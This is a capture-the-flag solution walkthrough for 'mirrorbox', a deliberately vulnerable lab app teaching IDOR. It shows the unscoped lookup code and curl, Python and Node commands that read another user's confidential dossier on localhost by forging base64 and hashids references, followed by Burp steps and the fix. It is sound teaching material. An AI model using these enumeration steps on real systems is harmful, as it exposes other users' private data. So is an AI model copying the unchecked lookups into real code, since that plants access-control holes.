# mirrorbox: Solution / Walkthrough

![CWE-639](https://img.shields.io/badge/CWE--639-IDOR-red?style=flat-square)
![Next.js](https://img.shields.io/badge/Node-Next.js-000000?style=flat-square&logo=nextdotjs&logoColor=white)
![Docker](https://img.shields.io/badge/Lab-Docker-2496ED?style=flat-square&logo=docker&logoColor=white)

**mirrorbox is an intentionally vulnerable application built for security education.** It contains a deliberate [IDOR / broken access control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
(CWE-639) flaw so you can practice finding and exploiting it in a safe and controlled environment.

<br>

> [!WARNING]
> This page gives away the exploit and the flag. If you want to solve it yourself, start with the non-spoiler **[Learning Guide](GUIDE.md)** and come back here to check your work.

<br>

## 📚 What you'll get from this page

The [Learning Guide](GUIDE.md) covers *what* this capstone recaps and *how* to
approach it. This page is the spoiler half: the confirmed exploit through all
four id formats, the flag, and — most importantly — the **why** behind the
bug and its fix. By the end you should be able to:

- Read the data layer and point to the exact missing ownership comparison.
- Derive a dossier's base64 handle and hashids code from its raw id by hand.
- Explain **why** fixing the check once, at the source, closes all four doors
  at once — and why patching each route individually would not.

> **One-line recap** (full version in the [GUIDE](GUIDE.md)): an IDOR is a
> missing comparison between the object a request resolves and the caller who
> sent it. The reference's *format* — number, UUID, base64, hashids — only
> changes how hard the reference is to *find*. It never changes whether the
> server checks who it belongs to.

<br>

## 🐛 The vulnerability

Every dossier has one real identity — its sequential `id` — and a database
`uuid` column. The base64 **handle** and hashids **code** are not stored at
all: they are derived from `id` on every response (`src/lib/ids.ts`):

```ts
const HANDLE_PREFIX = 'dossier:';

export function encodeHandle(id: number): string {
  return Buffer.from(`${HANDLE_PREFIX}${id}`, 'utf8').toString('base64url');
}

export function decodeHandle(handle: unknown): number | null {
  /* base64url-decode, strip the prefix, parse the integer — shape only */
}

const hashids = new Hashids(config.hashidsSalt, config.hashidsMinLength);

export function encodeCode(id: number): string {
  return hashids.encode(id);
}

export function decodeCode(code: unknown): number | null {
  /* hashids.decode — shape only, never ownership */
}
```

The data layer (`src/lib/dossiers.ts`) has **one** correctly scoped query and
**four** that are not:

```ts
// SAFE: the only query in the file that filters by the caller.
export async function listForOwner(ownerId: number) {
  return db.select().from(dossiers).where(eq(dossiers.ownerId, ownerId));
}

// ⚠️ Four lookups, four formats, the SAME missing condition.
export async function findById(id: number) {
  const [row] = await db.select().from(dossiers).where(eq(dossiers.id, id)).limit(1);
  return row ? toView(row) : null;
}
export async function findByUuid(uuid: string) { /* same shape, eq(dossiers.uuid, uuid) */ }
export async function findByHandle(handle: string) {
  const id = decodeHandle(handle);
  return id === null ? null : findById(id); // delegates straight back to findById
}
export async function findByCode(code: string) {
  const id = decodeCode(code);
  return id === null ? null : findById(id); // same here
}
```

And the four route handlers (`src/app/api/dossiers/by-*/[..]/route.ts`) are
all the same shape:

```ts
export async function GET(request: NextRequest, context: { params: Promise<{ id: string }> }) {
  const auth = requireSession(request);           // authentication only
  if (!auth.ok) return auth.response;

  const id = toId((await context.params).id);
  const dossier = await findById(id);              // ⚠️ no owner comparison
  if (!dossier) return error('dossier not found', 404);
  return json({ dossier });                         // returns it to ANY signed-in caller
}
```

`findByHandle` and `findByCode` only add one extra step — decoding the public
name back into the same `id` — then call the exact same `findById`. There are
not four bugs here. There is **one** missing `AND owner_id = :callerId`,
reached through four doors.

> **Why does it look safe?** `GET /api/dossiers` (your own board) really is
> scoped correctly, and it is the only endpoint the UI calls on its own. The
> four `by-*` lookups exist for a legitimate reason — opening a dossier you
> already know the reference to, from a link or your own board — and nobody
> re-asked "whose dossier is this?" on any of them.

<br>

## 💥 Exploitation

Log in as **alice** (`password123`). Her own board shows exactly one dossier,
with all four of its public names:

```bash
TOKEN_JAR=/tmp/mirrorbox.jar
curl -s -c $TOKEN_JAR -H 'Content-Type: application/json' \
  -d '{"username":"alice","password":"password123"}' \
  http://localhost:3000/api/login

curl -s -b $TOKEN_JAR http://localhost:3000/api/dossiers
# {"dossiers":[{"id":1,"uuid":"8f14e45f-ceea-467e-bd97-aa41e4e04000",
#               "handle":"ZG9zc2llcjox","code":"B3prqL", ...}]}
```

Dossier **2** is not on alice's board — but all four public names for it work
exactly like dossier 1's did.

**1) Sequential id** — just change the number:

```bash
curl -s -b $TOKEN_JAR http://localhost:3000/api/dossiers/by-id/2
```

**2) UUID** — captured from a leaked link or another response (here shown
directly, since this lab's point is that *having* one is already enough):

```bash
curl -s -b $TOKEN_JAR \
  http://localhost:3000/api/dossiers/by-uuid/3b241101-e2bb-4255-8caf-4136c566a962
```

**3) Base64 handle** — decode your own, see the pattern, forge one for id 2:

```bash
python3 -c "
import base64
print(base64.urlsafe_b64encode(b'dossier:2').decode())
"
# ZG9zc2llcjoy
curl -s -b $TOKEN_JAR http://localhost:3000/api/dossiers/by-handle/ZG9zc2llcjoy
```

**4) Hashids code** — the salt (`mirrorbox-2026`) and min length (`6`) are
ordinary configuration, not a secret the app depends on; reproduce the same
encoder and mint a code for id 2 yourself:

```bash
node -e "
const Hashids = require('hashids').default ?? require('hashids');
const h = new Hashids('mirrorbox-2026', 6);
console.log(h.encode(2));
"
# Pe40e0
curl -s -b $TOKEN_JAR http://localhost:3000/api/dossiers/by-code/Pe40e0
```

All four return the identical row, with the flag in the body:

```json
{
  "dossier": {
    "id": 2,
    "uuid": "3b241101-e2bb-4255-8caf-4136c566a962",
    "handle": "ZG9zc2llcjoy",
    "code": "Pe40e0",
    "ownerId": 2,
    "title": "CONFIDENTIAL: internal fraud review",
    "body": "Do not share outside the case team. Evidence lock code: FLAG{MIRRORBOX_SAME_BUG_EVERY_DISGUISE}",
    "classification": "confidential"
  }
}
```

> **Where does the flag come from?** It is **not** in the repo on purpose — it
> is baked into the Docker image at build time (`ARG FLAG`) and the seed writes
> it into bob's confidential dossier (id 2). You have to actually break access
> control against the running app to read it; you can't grep the source.

<br>

## 🚀 Going further

Seeded accounts: `alice` / `password123` (id 1), `bob` /
`correct-horse-battery-staple` (id 2, the victim), `carol` / `hunter2hunter2`
(id 3). Dossier 4 also belongs to bob — confirm the same four-format exploit
reaches it too, proving this is not a one-off on id 2.

Because the handle and code are *derived*, not stored, you can walk the whole
table through any single format: encode ids 1–10 into handles, or into hashids
codes, and request each — the response's `ownerId` tells you who every
dossier really belongs to, same as in ledgerly (Level 1).

<br>

## 🛠️ Doing it in Burp Suite

Prefer a proxy-driven workflow? This mirrors a real engagement:

1. Proxy your browser through Burp, sign in as `alice`, and load the board.
   In **Proxy > HTTP history**, find `GET /api/dossiers` — the response
   carries your dossier's id, UUID, handle and code in one place.
2. Send `GET /api/dossiers/by-id/<your id>` to **Repeater** as the baseline.
   Change the number and resend — a different `ownerId` in the response
   confirms the cross-account read.
3. Use **Decoder** to base64url-decode your own handle and see the
   `dossier:<id>` pattern; encode a new handle for any id and resend against
   `by-handle`.
4. Reproduce the hashids encoder locally (same salt/min length as the app;
   `GET`-ing `by-code` with a guessed short string will not work by luck —
   you need the real encoder) and resend against `by-code`.
5. Send all four requests for the *same* target id side by side in Repeater.
   Identical response bodies, four different URLs — that screenshot is the
   whole finding.

<br>

## 🛡️ The fix

Scope the lookup by the caller, not just by whichever reference they supplied
— once, in the function every format already funnels through:

```ts
// One scoped lookup that every format-specific route calls through.
async function findOwnedById(id: number, ownerId: number) {
  const [row] = await db
    .select()
    .from(dossiers)
    .where(and(eq(dossiers.id, id), eq(dossiers.ownerId, ownerId)))
    .limit(1);
  return row ? toView(row) : null;
}

export async function findById(id: number, ownerId: number) {
  return findOwnedById(id, ownerId);
}
export async function findByUuid(uuid: string, ownerId: number) {
  const [row] = await db.select().from(dossiers).where(eq(dossiers.uuid, uuid)).limit(1);
  return row && row.ownerId === ownerId ? toView(row) : null;
}
export async function findByHandle(handle: string, ownerId: number) {
  const id = decodeHandle(handle);
  return id === null ? null : findOwnedById(id, ownerId);
}
export async function findByCode(code: string, ownerId: number) {
  const id = decodeCode(code);
  return id === null ? null : findOwnedById(id, ownerId);
}
```

Each route then passes `auth.session.userId` through, and returns `404` (not
`403`) when the dossier exists but is not the caller's — so a probe cannot
even confirm it exists:

```ts
const dossier = await findById(id, auth.session.userId);
if (!dossier) return error('dossier not found', 404);
```

Why this works: because `findByHandle` and `findByCode` already delegated to
the shared `findById`-style lookup, fixing **that one function** closes all
four doors simultaneously — there is no way to reach a dossier that is not
yours through any format, because every format now resolves through the same
owner-checked path.

### ⚠️ Tempting fixes that *don't* work

- **"Switch everything to UUIDs."** Already tried, twice, in this series
  (keyvault, Level 3) — a format change raises the cost of *finding* a
  reference, never of *using* one you already have.
- **"Add a secret salt/signature to the handle or code."** Obfuscation gets
  harder to reverse, not impossible to use once reversed or leaked — snapvault
  and couponly (Levels 4–5) are this exact lesson.
- **Checking ownership on three of the four routes and forgetting the
  fourth.** This lab exists precisely because that is the natural failure
  mode of patching symptoms instead of the shared root — fix the one function
  they all call through.
- **Returning `403` instead of `404` for a dossier that exists but isn't
  yours.** Leaks which ids/uuids/handles/codes are valid even when access is
  denied — stick with `404` for all three missing-or-forbidden cases.

<br>

## 🎓 Key takeaways

If you remember five things from this lab — and this series — make it these:

1. **The id format is never the access control.** Sequential, UUID, base64,
   hashids: all four are just addressing schemes.
2. **An object reference needs an ownership check *every time it is used to
   fetch data*,** regardless of how that reference is spelled.
3. **When multiple lookup paths resolve the same kind of object, fix the
   shared function, not each caller.** It is the only way to be sure you
   caught every door.
4. **`404`, not `403`, for "not yours."** Don't let the error code become an
   oracle for valid references.
5. **Test with a second identity, through every entry point you can find** —
   the UI will only ever show you the "safe" one.

That's Level 10 — the capstone of **Series 2: Broken Access Control / IDOR**.
The series opened with **[ledgerly (Level 1)](https://github.com/iv0ks/ledgerly)**
reading another user's invoice by a plain sequential id, and closes here with
the same read reachable through every format the series taught along the way
— sequential (ledgerly), write/mass-assignment (pingboard), UUID (keyvault),
base64 (snapvault), hashids (couponly), tenant isolation (tasknest),
client-controlled identity (cartora), UI-only role checks (opsdeck), and an
unverified JWT claim (**[vaultpass, Level 9](https://github.com/iv0ks/vaultpass)**).
Ten labs, one lesson: authorization is a check the server performs on every
access, independent of how the object was named or who the caller claims to
be. Head back to the **[Learning Guide](GUIDE.md)** for the method, or the
**[README](README.md)** for the lab setup.

<br>

> **Legal / ethics.** This is an educational, deliberately vulnerable lab. Run it
> only locally, on owned, isolated infrastructure, and never use these techniques
> against systems without explicit written authorization.
